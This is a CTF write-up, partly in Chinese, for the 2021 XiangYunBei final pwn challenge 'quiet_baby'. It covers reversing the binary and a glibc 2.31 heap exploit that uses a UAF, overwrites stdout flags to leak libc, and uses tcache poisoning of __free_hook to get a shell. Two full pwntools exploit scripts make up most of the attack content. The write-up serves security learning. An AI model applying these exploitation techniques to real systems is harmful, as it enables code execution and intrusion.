# XiangYunBei 2021 Final pwn: quiet_baby

> 第二届“祥云杯”网络安全大赛暨吉林省第四届大学生网络安全大赛线下决赛 吉林长春
>
> 第二日 社会组 Jeopardy赛制   point: 400  solved: less than 5
>
> files: `pwn`(renamed to `pwn_ori`), libc-2.31.so
>
> additional files: no alarm pwn, i64 with comment, corresponding ld-2.31.so
>
> exp files: redbud_wh_babyquiet_ori.py: redbud wh师傅的原始exp
>
> 写在最前：第一次参加线下赛，很感谢liwl给予的机会，以及gztime 春哥的carry。这题没做出来十分可惜，逆向层对程序理解已经十分充分了，主要是对IO file结构不了解，且此前未接触过通过修改`stdout._flags`来泄露libc地址，其余知识都是之前学过的。还想着用程序中依据1B泄露高1B的逻辑，1B1B的泄露libc地址，1B1B的修改指针。总之就是学艺不精，见识尚浅，才学浅薄，仍需积累。最原始的exp出自redbud wh师傅，特别感谢！wh在赛后对exp的描述及后续的释疑对我理解exp过程、学习新知识帮助很大。redbud🐂🐸

所需知识/考察知识点：

1. unsorted bin leak libc addr: fw / bk of chunk in unsorted bin
2. `_IO_2_1_stdout_, main_arena, fw of unsorted bin chunk` 三个地址很接近，基本只有最后2B有区别，可以利用这个，泄露unsorted bin上的chunk的fw后，把地址改成`&_IO_2_1_stdout_`
3. `_IO_FILE: _IO_2_1_stdout_` structure, 修改 `_IO_2_1_stdout_._flags etc` 达到 leak libc addr
4. Tcache Poisoning: UAF. cover `__free_hook` to `system` 常规套路 注意绕安全检查
5. malloc时，如果unsorted bin被破坏，会有SIGSEGV

题目主要漏洞在于free后未置NULL，malloc, edit, free时只做判空，所以指针可以覆盖、double free，存在UAF，但输出函数talk只能得到低2B的内容（在已知最低1B时）

利用思路：填满tcache，放一个victim chunk到unsorted bin。利用talk得到低2B，再覆盖victim fw的低2B，使其为`&_IO_2_1_stdout_`，然后malloc拿到`&_IO_2_1_stdout_`，覆盖其`_flags`及后面3个64bit，然后就会泄露出一个libc上的地址，计算得到libc基址。恢复遭到破坏的victim fw/bk，使unsorted bin双向链表恢复正常，后面就用常规的tcache UAF覆盖`__free_hook` 为 `system` 来getshell。

# Preanalysis and ld.so libc.so

```bash
$ strings libc-2.31.so| grep GLIBC
GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.2) stable release version 2.31.
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

- 保护全开
- 现场没有给出ld.so，给出的ld是从http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/ 中下载的`libc6_2.31-0ubuntu9.2_amd64.deb`中提取出来，其中的libc.so就是题目给的libc-2.31.so，hash相同。

# IDA Analysis

- 程序有alarm函数，超时未响应则退出，影响debug，pwn文件已经将这段代码nop掉了
- 程序有两处影响IDA逆向的指令，`00000000000012E8	0x1	FF 	90; 00000000000019DD	0x1	3E 	90 `，会影响main中跳转表的逆向，可以将其nop掉，但不要将其apply到binary中，否则会有段错误。即这部分指令实际上是参与执行的，但是会影响IDA分析。提供的i64文件已经patch掉了

```cpp
void __fastcall main(__int64 a1, char **a2, char **a3)
{
  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  ini_seed();                                   // alarm function here
  menu();
  while ( 1 )
  {
    menu_sub();
    read(0, buf, 2uLL);
    switch ( buf[0] )
    {
      case '1':
        give();  // idx最大为10 可以为负数 malloc时可以覆盖之前malloc的指针
        break;
      case '2':
        edit();   // 指针不为空，就可以依据arr_size改arr_ptr+idx处的指针
        break;
      case '3':
        talk();   // 最后1B不变，所以可以根据输出得到低第二B
        break;
      case '4':
        delete();  // free后未置0 UAF 可多次free 但要绕double free检查 要改bk后再free
        break;
      case '5':
        exit(8);
      default:
        continue;
    }
  }
}
```

- talk函数，后续会用这里的逻辑来泄露unsorted bin fw的低第二byte

```cpp
unsigned __int64 talk()
{
  char ptr_1B; // [rsp+6h] [rbp-1Ah]
  char ptr_2B; // [rsp+7h] [rbp-19h]
  unsigned int idx; // [rsp+8h] [rbp-18h]
  int rand_num; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  // ................................................
  read(0, buf, 3uLL);
  idx = str2int(buf);
  if ( idx > 0xA )
  {
    puts("Segmentation Fault");
    exit(0);
  }
  if ( !arrPtr[idx] )
  {
    puts("Segmentation Fault");
    exit(0);
  }
  if ( flagILoveC )               // 注意这个是只要前面set过一次就行 不是每个chunk都要满足ILoveC
  {
    ptr_1B = *(_BYTE *)arrPtr[idx];             // 最低1B
    ptr_2B = *((_BYTE *)arrPtr[idx] + 1);
    rand_num = rand() % 127;                    // 生成randnum
    printf("Baby said: ! @ # $ % ^ & * ( %c\n", (unsigned int)(char)(rand_num ^ ptr_1B));// 输出randnum ^ 最低1B
    printf("Continued the baby: ! @ # $ % ^ & * ( %c\n", (unsigned int)(char)(rand_num ^ ptr_2B));// 输出randnum ^ 低第2B
    puts("Sure enough...The baby slurred his speech");
  }
  else
  {
    puts("Baby said: ! I@ % ^  & # & W* ( A!  N # ! T @  ! % $ C ^ @");
    puts("It looks like the baby is unhappy that he didn't get the primer plus");
  }
  return __readfsqword(0x28u) ^ v6;
}
```



# Vulnerability

1. give: idx最大为10，可以为负(这个没用到)，malloc时不检查arr[idx]处是否为空，可以覆盖。size记录在另一个数组arrSize中
2. edit: arr[idx]不为空就可以edit，size依据arrSize[idx]
3. talk: 之前give时的content出现过`ILoveC`时，输出`randnum ^ lsB, randnum ^ ls2ndB`，lsB：指针的最低byte，ls2ndB：指针的低第二byte，但是在开启ASLR时，低12bit不变，即这里可以leak最低2B
4. delete: UAF. free后未置NULL，且不改变arrSize[idx]. 可以对一个指针多次free



# exp process 

1. 填满tcache，放一个chunk到unsorted bin，同时这个chunk还得是tcache head chunk。即这个chunk被最后放入tcache，紧接着再free一次，放入unsorted bin。
2. 利用程序的talk，泄露放入unsorted bin的chunk的fw的低2B。利用的是异或运算性质 + libc地址的低12bit不变性
3. edit unsorted bin chunk的fw值，使其指向`_IO_2_1_stdout_`。调试时`p &_IO_2_1_stdout_`，通过Step-2泄露的2B计算。
4. malloc两次，拿到`_IO_2_1_stdout_`指针，覆盖`_IO_2_1_stdout_`的`_flags`等，泄露出libc上的地址，通过该地址与libc基址，计算出偏移，即可得到ASLR下的libc基址
5. 恢复unsorted bin：此时unsorted bin上的chunk和Step-4 malloc出来的chunk是同一个，但在改`_flags`时fw被覆盖了，unsorted bin的双向链表被破坏，所以需要恢复回去，否则后面malloc时会报段错误
6. 利用tcache poisoning UAF，改`__free_hook`为`system`，`system("/bin/sh\x00")`get shell



# exp

- 用到的所有硬编码地址都要和libc配套
- Step-3计算`&_IO_2_1_stdout_`时，低2B可能产生进位，但是由于无法泄露第3B，所以实际上这个进位是无法处理的，出现的时候就结束掉再来一次（开启了ASLR的情况下）
- 本地测试时将`system`改为`puts`，否则可能会报奇奇怪怪的错误，打远端时换回`system`

```python
from pwn import *
context.arch = 'amd64'
context.log_level = "debug"
IP = "172.20.2.7"
PORT = 26351
DEBUG = 1


if DEBUG:
    p = process(["./ld-2.31.so", "./pwn"], env={"LD_PRELOAD": "./libc-2.31.so"})
    # attention: argv[1] for ./pwn when running with ./ld.so ./pwn
    base = p.libs()[p._cwd + p.argv[1].decode().strip('.')]  # fix bytes str error in py3.9
    print("base:", base, p.libs())
    libc = ELF("./libc-2.31.so")
else:
    p = remote(IP, PORT)
    libc = ELF("./libc-2.31.so")


def ru(x): return p.recvuntil(x)
def se(x): return p.send(x)
def rl(): return p.recvline()
def sl(x): return p.sendline(x)
def rv(x): return p.recv(x)
def sa(a, b): return p.sendafter(a, b)
def sla(a, b): return p.sendlineafter(a, b)
def l64(): return u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))  # python 3.9 pass


def debug(cmd=""):
    gdb.attach(p, cmd)


def cmd(idx):
    sla("Todo:\n", str(idx))


def add(idx, size, content):
    cmd(1)
    sla("\n", str(idx))
    sla("\n", str(size))
    sla("\n", content)


def edit(idx, content):
    cmd(2)
    sla("\n", str(idx))
    sla("\n", content)


def talk(idx):
    cmd(3)
    sla("\n", str(idx))
    ru("Baby said: ! @ # $ % ^ & * ( ")
    B0 = ru("\n")[-2]
    ru("Continued the baby: ! @ # $ % ^ & * ( ")
    B1 = ru("\n")[-2]
    return int(B0), int(B1)


def free(idx):
    cmd(4)
    sla("\n", str(idx))


def dd():
    if DEBUG:
        cmd = ""
        cmd += "b *%d\n" % (base + 0x198E)  # call menu_sub
        cmd += "set $a=%d\n" % (base + 0x4080)  # _QWORD *arrPtr[] # x /10xg $a : ptr array
        debug(cmd)


# === Step-1: malloc 8 chunks, full tcache(cnt=7), 1 to unsorted bin
for i in range(8):  # c7: avoid top chunk merging
    add(i, 0xa0, "ILoveC")  # heap chunks: c0, c1, c2, ... c7, top_chunk
for i in range(7):  # 0 ~ 6
    free(i)   # full tcache # tcache(0xb0) cnt=7: c6, c5, ...,c0
edit(6, "B" * 16)  # double free prepare, cover fw/bk of c6, avoid "free(): double free detected in tcache 2"
free(6)  # c6 to unsorted bin
# heap bins: tcache(0xb0) cnt=7: c6, libc addr, trash addr... unsorted: c6


# == Steo-2: leak 2nd byte of c6 fw/bk
B0, B1 = talk(6)
randnum = B0 ^ 0xe0  # 0xe0: lowest Byte of c6'fw/bk
# p &_IO_2_1_stdout_
B1 = randnum ^ B1
stdout_ls2B = b"\xa0" + int(B1 + 0xa + 1).to_bytes(1, "big")  # &_IO_2_1_stdout_ - c6_fw = 0xac0
print("==> B0,B1:", bytes([B0, B1]).hex(), "rand:", hex(randnum), "stdout_ls2B", stdout_ls2B.hex())


# === Step-3: cover c6_fw with &_IO_2_1_stdout_ (only lowest 2B)
cmd(2)  # edit
sla("\n", str(6))  # idx=6
sa("\n", stdout_ls2B)  # cover lowest 2B # verify: &_IO_2_1_stdout_ == c6_fw != c6_bk

# heap bins: tcache(0xb0) cnt=7: c6, &_IO_2_1_stdout_, Corrupted... unsorted: c6
# === Step-4: leak libc_base by changing _flag etc of _IO_2_1_stdout_
add(6, 0xa0, "deadbeef")  # tcache(0xb0) cnt=6: &_IO_2_1_stdout_, Corrupted... # c6_fw=deadbeef, c6_bk=0xa(\n)
cmd(1)  # malloc
sla("\n", str(5))  # idx=5
sla("\n", str(0xa0))  # size=0xa0
sa("\n", p64(0xfbad3887) + p64(0) + p64(0) + p64(0) + b'\x00')  # c5/_IO_2_1_stdout_ : x /10xg 0x00007f055b0446a0
# 0x7f055b0446a0 <_IO_2_1_stdout_>:       0x00000000fbad3887      0x00007f055b044723
# 0x7f055b0446b0 <_IO_2_1_stdout_+16>:    0x00007f055b044723      0x00007f055b044723
# 0x7f055b0446c0 <_IO_2_1_stdout_+32>:    0x00007f055b044723      0x00007f055b044723
leak_addr = l64()
libc_base = leak_addr - 0x1eb980  # cal offset between leak_addr and libc_base (vmmap in gdb)
print("==> leak_addr:", hex(leak_addr), "libc:", hex(libc_base))

# heap bins: tcache(0xb0) cnt=5: Corrupted chunk at 0xfbad2887 unsorted: c6
# === Step-5: recover c6_fw/bk. if not, SIGSEGV occur in Step-6
c6fw = 0x1ebbe0 + libc_base
cmd(2)  # edit
sla("\n", str(6))  # idx=6
sa("\n", p64(c6fw) + p64(c6fw))  # recover c6_fw/bk

# === Step-6: tcache poisoning: UAF
free_hook = libc.symbols["__free_hook"] + libc_base
system_addr = libc.symbols["system"] + libc_base  # puts for local test # system
add(0, 0x20, "c0")  # './ld-2.31.so' stopped with exit code -11 (SIGSEGV) here if without Step-5
add(1, 0x20, "c1")
free(0)
free(1)  # tcache(0x30) cnt=2: c1, c0
edit(1, p64(free_hook))      # tcache(0x30) cnt=2: c1, &__free_hook
add(1, 0x20, "/bin/sh\x00")  # tcache(0x30) cnt=1: &__free_hook # c0:/bin/sh
add(0, 0x20, p64(system_addr))  # get &__free_hook and cover __free_hook to __free_hook
free(1)  # trriger system("/bin/sh\x00")

dd()  # debug
p.interactive()

```





# Brute force exp: redbud wh original exp

redbud wh师傅给的原始exp，祥云杯第二名，Jeopardy模式第一名(1200points)。

- `context.terminal`根据自己的环境注释掉或改掉
- 没有调用talk，暴力碰撞`&_IO_2_1_stdout_`的第12-15bit(最低第4个16进制数)。即程序中的addr`16a0`中，`6a0`对应`&_IO_2_1_stdout_`的低12bit，1是和开启ASLR的远端来碰撞

```python
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'
context.log_level = "debug"
IP = "172.20.2.7"
PORT = 26351
DEBUG = 0

def pwn():
    if DEBUG:
        p = process("./pwn", env={"LD_PRELOAD":"/home/ctf/2.31-0ubuntu9.2_amd64/libc-2.31.so"})
        # p = process("./pwn")
        base = p.libs()[p._cwd+p.argv[0].strip('.')]
        # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        libc = ELF("/home/ctf/2.31-0ubuntu9.2_amd64/libc-2.31.so")

    else:
        p = remote(IP, PORT)
        libc = ELF("./libc-2.31.so")

    ru = lambda x : p.recvuntil(x)
    se = lambda x : p.send(x)
    rl = lambda : p.recvline()
    sl = lambda x : p.sendline(x)
    rv = lambda x : p.recv(x)
    sa = lambda a,b : p.sendafter(a,b)
    sla = lambda a,b : p.sendlineafter(a, b)
    l64 = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))


    def debug(cmd=""):
        gdb.attach(p, cmd)

    def cmd(idx):
        sla("Todo:\n", str(idx))

    def add(idx, size, content):
        cmd(1)
        sla("\n", str(idx))
        sla("\n", str(size))
        sla("\n", content)


    def edit(idx, content):
        cmd(2)
        sla("\n", str(idx))
        sla("\n", content)

    def talk(idx):
        cmd(3)
        sla("\n", str(idx))
        ru("Baby said: ! @ # $ % ^ & * ( ")
        c1 = ru("\n")[:-1]
        ru("Continued the baby: ! @ # $ % ^ & * ( ")
        c2 = ru("\n")[:-1]
        return c1,c2

    def free(idx):
        cmd(4)
        sla("\n", str(idx))

    def dd():
        if DEBUG:
            cmd = ""
            cmd += "b *%d\n" % (base+0x1585)
            cmd += "set $a=%d\n" % (base+0x4080)
            # cmd = 'set $a=%d\n'%(base+0x4060) # bullet_ptr[0x13]
            # cmd += "set $b=%d\n"%(base+0x4050) # bullet_list
            # cmd += "set $c=%d\n"%(base+0x4010) # remain size
            # cmd += "b *%d\n" % (base+0x167B) # break at free
            debug(cmd)

    for i in range(8):
        add(i, 0xa0, "ILoveC")

    # idx = 7, last

    for i in range(7):
        free(i)
    edit(6, "a"*16)
    free(6)


    cmd(2)
    sla("\n", str(6))
    sa("\n", '\xa0\x16')
    sleep(1)

    add(0, 0xa0, "ILoveC")

    cmd(1)
    try:
        sla("\n", str(1))
        sla("\n", str(0xa0))
        sa("\n", p64(0xfbad3887)+p64(0)*3+'\x00')
        libc_base = l64() + 0x1eb980 - 0x3d7300
    except:
        p.close()
        return 1

    free_hook = libc.symbols['__free_hook'] + libc_base
    system_addr = libc.symbols['system'] + libc_base
    arena_addr = 0x1ebbe0 + libc_base

    print('libc: ', hex(libc_base))

    free(6)
    cmd(2)
    sla("\n", str(6))
    sa("\n", p64(arena_addr)+p64(arena_addr))
    sleep(1)

    print("free_hook: ", hex(free_hook))
    print("system: ", hex(system_addr))

    add(9, 0x30, "/bin/sh/\x00\n")
    free(9)
    edit(9, p64(free_hook))
    add(9, 0xa0, "/bin/sh\x00")
    add(3, 0xa0, p64(system_addr))
    dd()
    free(9)
    # add(2, 0x30, p64(system_addr))
    p.interactive()

for i in range(40):
    print(i)
    pwn()

```

